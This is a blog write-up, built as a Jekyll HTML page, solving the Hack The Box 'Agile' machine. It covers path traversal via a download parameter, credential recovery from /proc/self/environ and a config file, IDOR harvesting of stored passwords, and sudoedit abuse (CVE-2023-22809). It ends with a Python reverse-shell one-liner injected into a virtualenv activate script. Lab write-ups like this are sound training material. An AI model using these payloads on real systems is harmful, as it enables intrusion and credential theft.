@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Hack The Box - Agile - Medium Machine</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="shortcut icon" type="image/png" href="/assets/favicon.png">
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box - Agile - Medium Machine | OFenomeno</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Hack The Box - Agile - Medium Machine" />
+<meta name="author" content="OFenomeno" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:8000/HackTheBox-Agile-Medium" />
+<meta property="og:url" content="http://localhost:8000/HackTheBox-Agile-Medium" />
+<meta property="og:site_name" content="OFenomeno" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-11T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Agile - Medium Machine" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"OFenomeno","url":"ofenomeno.xyz"},"dateModified":"2023-03-11T00:00:00+01:00","datePublished":"2023-03-11T00:00:00+01:00","description":"Introduction","headline":"Hack The Box - Agile - Medium Machine","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/HackTheBox-Agile-Medium"},"url":"http://localhost:8000/HackTheBox-Agile-Medium"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>root@ofenomeno:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/posts"><h2 class="header-link">Posts</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Hack The Box - Agile - Medium Machine</h2>
+  <time datetime="2023-03-11T00:00:00+01:00" class="by-line">11 Mar 2023</time>
+  <h1 id="-introduction"><a href="#Introduction"></a> Introduction</h1>
+
+<p><strong>Agile</strong> is a medium HackTheBox Linux machine, the user access was easy in my opinion but the LPE was harder.</p>
+
+<p>My work environment for hacking this machine:</p>
+<ul>
+  <li>Ubuntu 20.04 LTS with some hacking tools installed</li>
+  <li>An <a href="https://github.com/ThePorgs/Exegol">Exegol</a> instance</li>
+</ul>
+
+<h2 id="user-flag"><a href="#User-Flag"></a>User flag</h2>
+
+<h3 id="enumeration"><a href="#Enumeration"></a>Enumeration</h3>
+
+<p>There was nothing special about port scanning, only ssh and http ports were opened.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</code></pre></div></div>
+
+<p>There was nothing with Nikto too.</p>
+
+<p>The website to attack was a password vault, one of the feastures was that an user could export its password vault at CSV format.</p>
+
+<p><img src="/assets/agile/vault.png" alt="" /></p>
+
+<p>Hmmm… LFI, are you there?</p>
+
+<h3 id="lfi"><a href="#LFI"></a>LFI</h3>
+
+<p>So <code class="language-plaintext highlighter-rouge">http://superpass.htb/vault/export</code> was redirecting to <code class="language-plaintext highlighter-rouge">http://superpass.htb/download?fn=user_export_blablabla.csv</code>.</p>
+
+<p>In this case, <strong>fn</strong> parameter was vunerable to Local File Inclusion.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://superpass.htb/download?fn=../../../etc/passwd
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum,1,1,:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre></div></div>
+
+<h3 id="ssh-credentials"><a href="#SSH-Creds"></a>SSH Credentials</h3>
+
+<p>From the LFI, I’ve tried to fuzzing directories and files in order to find some intereting data.</p>
+
+<p>By reading <strong>/proc/self/environ</strong>, I’ve found /app/config_prod.json which gived us mysql creds for production database.</p>
+
+<p><img src="/assets/agile/proc_self_environ.png" alt="" /></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"SQL_URI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>When a potential file that I was fuzzing didn’t exist or was a directory, either <strong><em>FileNotFound</em></strong> or <strong><em>IsADirectory</em></strong> error were raised.</p>
+
+<p>After some time spent on guessing and fuzzing, I was convinced that this was a rabbit hole. The source of raised errors was <code class="language-plaintext highlighter-rouge">/app/app/superpass/views/vault_views.py</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">flask</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">flask_login</span> <span class="kn">import</span> <span class="n">login_required</span><span class="p">,</span> <span class="n">current_user</span>
+<span class="kn">from</span> <span class="nn">superpass.infrastructure.view_modifiers</span> <span class="kn">import</span> <span class="n">response</span>
+<span class="kn">import</span> <span class="nn">superpass.services.password_service</span> <span class="k">as</span> <span class="n">password_service</span>
+<span class="kn">from</span> <span class="nn">superpass.services.utility_service</span> <span class="kn">import</span> <span class="n">get_random</span>
+<span class="kn">from</span> <span class="nn">superpass.data.password</span> <span class="kn">import</span> <span class="n">Password</span>
+
+
+<span class="n">blueprint</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">Blueprint</span><span class="p">(</span><span class="s">'vault'</span><span class="p">,</span> <span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">'templates'</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/vault'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/vault.html'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">vault</span><span class="p">():</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">get_passwords_for_user</span><span class="p">(</span><span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">passwords</span><span class="o">=</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s">'passwords'</span><span class="p">:</span> <span class="n">passwords</span><span class="p">}</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/vault/add_row'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row_editable.html'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">add_row</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">Password</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">get_random</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+    <span class="c1">#import pdb;pdb.set_trace()
+</span>    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">p</span><span class="p">}</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/vault/edit_row/&lt;id&gt;'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row_editable.html'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">get_edit_row</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">get_password_by_id</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/vault/row/&lt;id&gt;'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row.html'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">get_row</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">get_password_by_id</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'/vault/add_row'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">add_row_post</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span>
+    <span class="n">site</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'url'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">site</span> <span class="ow">or</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s">''</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">add_password</span><span class="p">(</span><span class="n">site</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">render_template</span><span class="p">(</span><span class="s">'vault/partials/password_row.html'</span><span class="p">,</span> <span class="n">p</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'/vault/update/&lt;id&gt;'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row.html'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span>
+    <span class="n">site</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'url'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">site</span> <span class="ow">or</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="p">):</span>
+        <span class="n">flask</span><span class="p">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">update_password</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">site</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">p</span><span class="p">}</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="s">'/vault/delete/&lt;id&gt;'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">password_service</span><span class="p">.</span><span class="n">delete_password</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">''</span>
+
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/vault/export'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">export</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">current_user</span><span class="p">.</span><span class="n">has_passwords</span><span class="p">:</span>        
+        <span class="n">fn</span> <span class="o">=</span> <span class="n">password_service</span><span class="p">.</span><span class="n">generate_csv</span><span class="p">(</span><span class="n">current_user</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="sa">f</span><span class="s">'/download?fn=</span><span class="si">{</span><span class="n">fn</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">"No passwords for user"</span>
+    
+
+<span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/download'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span>
+    <span class="n">fn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'fn'</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'/tmp/</span><span class="si">{</span><span class="n">fn</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">make_response</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">resp</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Disposition'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'attachment; filename=superpass_export.csv'</span>
+    <span class="n">resp</span><span class="p">.</span><span class="n">mimetype</span> <span class="o">=</span> <span class="s">'text/csv'</span>
+    <span class="k">return</span> <span class="n">resp</span>
+</code></pre></div></div>
+
+<p>Focus on that line, there is a potential IDOR vulnerability which could lead us to other users’ passwords.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/vault/edit_row/&lt;id&gt;'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>By fuzzing ID parameter in the following URL <code class="language-plaintext highlighter-rouge">http://superpass.htb/vault/edit_row/ID</code>, we can find potential useful creds…</p>
+
+<p><img src="/assets/agile/corum.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>corum@agile:~$ id
+uid=1000(corum) gid=1000(corum) groups=1000(corum)
+corum@agile:~$ ls
+user.txt
+</code></pre></div></div>
+
+<h2 id="root-flag"><a href="#Root-Flag"></a>Root flag</h2>
+
+<h3 id="corum"><a href="#Corum"></a>Corum</h3>
+<p>Like I said in the intro, LPE was tougher than user flag.</p>
+
+<p>For our user <strong><em>corum</em></strong>, there was nothing exploitable (priviledged rights, suid bits, cronjobs…).
+However, two interesting services were active locally:</p>
+<ul>
+  <li>Test version of the password vault app test.superpass.htb  on port <strong>5555</strong>.</li>
+  <li>Chrome sandbox remote debugging on port <strong>41829</strong>.</li>
+</ul>
+
+<p>I’ve decided to check the test version of superpass, but local port forwarding was needed to get an access for it.</p>
+
+<p>Local port forwarding command for redrirecting test.superpass.htb locally to my port 8888:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 8888:127.0.0.1:5555 corum@superpass.htb
+</code></pre></div></div>
+
+<p>Of course I’ve exploited the same IDOR which was present on production environment, and it permitted me to retrieve an other user’s creds: edwards.</p>
+
+<p><img src="/assets/agile/edwards.png" alt="" /></p>
+
+<h3 id="edwards"><a href="#Edwards"></a>Edwards</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edwards@agile:~$ id
+uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edwards@agile:~$ sudo -l
+
+[...]
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt 
+</code></pre></div></div>
+
+<p>By checking CVE-2023-22809 and files owned by <code class="language-plaintext highlighter-rouge">dev_admin</code> group…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edwards@agile:~$ find / -group dev_admin 2&gt;/dev/null
+/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh
+</code></pre></div></div>
+<p>… we can confirm that dev_admin group owns /app/venv/activate file.</p>
+
+<p>Therefore, by using these commands, we can also editing <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code> by modifying <code class="language-plaintext highlighter-rouge">/app/config_test.json</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export EDITOR="nano -- /app/venv/bin/activate"
+sudo -u dev_admin sudoedit /app/config_test.json
+</code></pre></div></div>
+
+<p>We can inject a reverse shell payload like following at the beginning of <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+</code></pre></div></div>
+<p>And…</p>
+
+<p><img src="/assets/agile/root.png" alt="" /></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>OFenomeno</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+
+
+  
+</body>
+
+</html>
